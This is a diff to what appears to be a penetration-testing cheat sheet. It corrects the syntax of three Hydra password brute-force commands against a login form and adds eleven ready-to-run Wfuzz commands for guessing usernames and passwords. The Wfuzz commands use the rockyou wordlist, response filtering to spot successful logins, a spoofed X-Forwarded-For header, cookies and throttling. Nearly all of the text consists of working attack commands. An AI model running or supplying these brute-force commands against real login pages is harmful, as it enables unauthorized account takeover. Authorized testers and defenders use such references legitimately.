@@ -210,16 +210,87 @@ new_password=hacked
 **Hydra**:
 ```bash
 # HTTP POST form
-hydra -l admin -P /usr/share/wordlists/rockyou.txt \
-  https-post-form "target.com/login:username=^USER^&password=^PASS^:F=incorrect"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
 
 # With CSRF token
-hydra -l admin -P passwords.txt \
-  https-post-form "target.com/login:username=^USER^&password=^PASS^:csrf=^CSRF^:F=incorrect"
+hydra -l admin -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:csrf=^CSRF^:F=incorrect"
 
 # Multiple usernames
-hydra -L users.txt -P passwords.txt \
-  https-post-form "target.com/login:username=^USER^&password=^PASS^:F=incorrect"
+hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+**Wfuzz**:
+```bash
+# Basic password brute force (POST request)
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
+  -d "username=admin&password=FUZZ" \
+  --hh 1234 \
+  https://target.com/login
+
+# Username and password brute force
+wfuzz -c -z file,usernames.txt -z file,passwords.txt \
+  -d "username=FUZZ&password=FUZ2Z" \
+  --hh 1234 \
+  https://target.com/login
+
+# Hide responses by code
+wfuzz -c -z file,passwords.txt \
+  -d "username=admin&password=FUZZ" \
+  --hc 401,403 \
+  https://target.com/login
+
+# With custom headers
+wfuzz -c -z file,passwords.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -d "username=admin&password=FUZZ" \
+  --hh 1234 \
+  https://target.com/login
+
+# JSON POST request
+wfuzz -c -z file,passwords.txt \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"FUZZ"}' \
+  --hh 85 \
+  https://target.com/api/login
+
+# Show only successful attempts (by response length)
+wfuzz -c -z file,passwords.txt \
+  -d "username=admin&password=FUZZ" \
+  --sh 5678 \
+  https://target.com/login
+
+# Filter by response regex
+wfuzz -c -z file,passwords.txt \
+  -d "username=admin&password=FUZZ" \
+  --ss "Welcome" \
+  https://target.com/login
+
+# Hide by response regex (hide error messages)
+wfuzz -c -z file,passwords.txt \
+  -d "username=admin&password=FUZZ" \
+  --hs "incorrect|invalid|failed" \
+  https://target.com/login
+
+# With cookies
+wfuzz -c -z file,passwords.txt \
+  -b "session=abc123;csrf=xyz789" \
+  -d "username=admin&password=FUZZ" \
+  --hh 1234 \
+  https://target.com/login
+
+# Multiple FUZZ points with different wordlists
+wfuzz -c -z file,usernames.txt -z file,passwords.txt \
+  -d "user=FUZZ&pass=FUZ2Z&submit=login" \
+  --hc 200 \
+  https://target.com/login
+
+# Rate limiting (10 requests per second)
+wfuzz -c -z file,passwords.txt \
+  -d "username=admin&password=FUZZ" \
+  -t 10 -s 0.1 \
+  --hh 1234 \
+  https://target.com/login
 ```
 
 **Burp Intruder**:
